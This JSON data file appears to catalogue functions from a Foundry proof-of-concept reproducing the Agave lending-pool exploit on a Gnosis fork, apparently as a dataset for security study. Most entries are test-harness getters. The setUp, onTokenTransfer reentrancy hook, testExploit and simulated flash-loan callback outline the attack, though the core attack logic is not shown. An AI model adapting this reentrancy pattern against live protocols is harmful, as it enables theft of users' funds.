[
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "onTokenTransfer",
    "original_code": "    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {\n        //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1\n        if (_from == aweth && _value == 1) {\n            callCount++;\n        }\n        if (callCount == 2 && _from == aweth && _value == 1) {\n            borrowTokens();\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"gnosis\", 21_120_283); //fork gnosis at block number 21120319\n        lendingPool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool());\n        wethLiqBeforeHack = _getAvailableLiquidity(weth);\n        //Lets just mint weth to this contract for initial debt\n        vm.startPrank(tokenOwner);\n        //Mint initial weth funding\n        WETH.mint(address(this), 2728.934387414251504146 ether + 1);\n        // Mint LINK funding\n        LINK.mint(address(this), linkLendNum1);\n        vm.stopPrank();\n\n        //Approve funds\n        LINK.approve(address(lendingPool), type(uint256).max);\n        WETH.approve(address(lendingPool), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        //Call prepare and get it setup\n        _initHF();\n        _flashWETH();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AgaveExploit",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {\n        //We simulate a flashloan from uniswap for initial eth funding\n        _attackLogic(_amount0, _amount1, _data);\n    }\n\n",
    "description": ""
  }
]